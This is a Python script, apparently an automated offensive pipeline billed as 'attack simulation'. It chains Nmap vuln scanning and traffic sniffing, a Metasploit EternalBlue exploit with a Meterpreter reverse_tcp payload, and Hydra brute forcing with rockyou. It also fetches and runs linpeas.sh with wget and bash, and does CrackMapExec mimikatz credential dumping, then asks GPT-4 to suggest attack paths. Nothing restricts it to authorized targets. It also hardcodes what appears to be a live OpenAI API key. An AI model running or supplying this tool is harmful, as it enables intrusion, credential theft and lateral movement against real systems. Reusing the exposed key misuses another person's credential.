###auto_attack.py - for attack simulation###


import sys
import json
import subprocess
import openai
import nmap
from pymetasploit3.msfrpc import MsfRpcClient
from scapy.all import sniff, IP
from transformers import pipeline

# Set OpenAI API Key (Replace with your valid API key)
OPENAI_API_KEY = "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"
#openai.api_key = OPENAI_API_KEY

def log(message):
    """Print log messages with status indicators."""
    print(f"[+] {message}")

def ai_vulnerability_analysis(scan_results):
    """Uses AI to analyze scan results for potential attack vectors."""
    prompt = f"Analyze these security scan results and suggest attack paths:\n{scan_results}"
    openai.api_key = OPENAI_API_KEY 
    
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "system", "content": "You are a cybersecurity expert."},
                  {"role": "user", "content": prompt}]
    )
    
    return response["choices"][0]["message"]["content"]
  


def network_scan(target):
    """Perform advanced network scanning with Nmap."""
    log("Scanning target with Nmap...")
    nm = nmap.PortScanner()
    nm.scan(target, arguments="-A -T4 --script vuln")
    
    scan_results = nm.csv()
    log("Network scan completed.")
    return scan_results

def sniff_traffic(target):
    """Capture network traffic for anomalies."""
    log("Capturing network traffic...")
    packets = sniff(count=100, filter=f"host {target}")
    
    suspicious_packets = [pkt.summary() for pkt in packets if IP in pkt and pkt[IP].proto in [6, 17]]
    log("Traffic capture completed.")
    return suspicious_packets

def exploit_target(target, exploit_module="windows/smb/ms17_010_eternalblue"):
    """Automate exploitation using Metasploit."""
    log(f"Attempting exploitation: {exploit_module}")
    
    client = MsfRpcClient('password', ssl=True)
    exploit = client.modules.use('exploit', exploit_module)
    exploit['RHOSTS'] = target
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    exploit.execute(payload=payload)
    
    log("Exploitation executed.")
    return "Exploit executed"

def brute_force_attack(target, service="ssh", username="admin", wordlist="/usr/share/wordlists/rockyou.txt"):
    """Perform brute-force attacks using Hydra."""
    log(f"Starting brute-force attack on {service} service...")
    
    result = subprocess.run(
        ["hydra", "-L", username, "-P", wordlist, f"{target}", service],
        capture_output=True, text=True
    )
    
    log("Brute-force attack completed.")
    return result.stdout

def privilege_escalation(target):
    """Attempt privilege escalation using LinPEAS/WinPEAS."""
    log("Checking for privilege escalation opportunities...")
    response = subprocess.run(["wget", f"{target}/linpeas.sh", "-O", "linpeas.sh"], capture_output=True, text=True)
    result = subprocess.run(["bash", "linpeas.sh"], capture_output=True, text=True)
    log("Privilege escalation check completed.")
    return result.stdout

def lateral_movement(target):
    """Simulate lateral movement using CrackMapExec."""
    log("Performing lateral movement attempt...")
    response = subprocess.run(["crackmapexec", target, "--mimikatz"], capture_output=True, text=True)
    log("Lateral movement completed.")
    return response.stdout

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 auto_attack.py <target>")
        sys.exit(1)

    target = sys.argv[1]
    log(f"🔍 Starting AI-driven attack simulation on {target}...")

    # Step 1: Reconnaissance
    network_results = network_scan(target)
    traffic_results = sniff_traffic(target)

    # Step 2: Exploitation
    exploit_results = exploit_target(target)

    # Step 3: Credential Attacks
    brute_force_results = brute_force_attack(target)

    # Step 4: Privilege Escalation
    privilege_results = privilege_escalation(target)

    # Step 5: Lateral Movement
    lateral_results = lateral_movement(target)

    # Step 6: AI Analysis
    ai_analysis = ai_vulnerability_analysis(network_results + "\n" + str(traffic_results))

    # Save results to a JSON report
    scan_results = {
        "network_scan": network_results,
        "traffic_analysis": traffic_results,
        "exploitation": exploit_results,
        "brute_force": brute_force_results,
        "privilege_escalation": privilege_results,
        "lateral_movement": lateral_results,
        "ai_analysis": ai_analysis
    }

    report_filename = f"attack_report_{target}.json"
    with open(report_filename, "w") as f:
        json.dump(scan_results, f, indent=4)

    log(f"✅ Attack simulation completed! Report saved as {report_filename}")

if __name__ == "__main__":
    main()

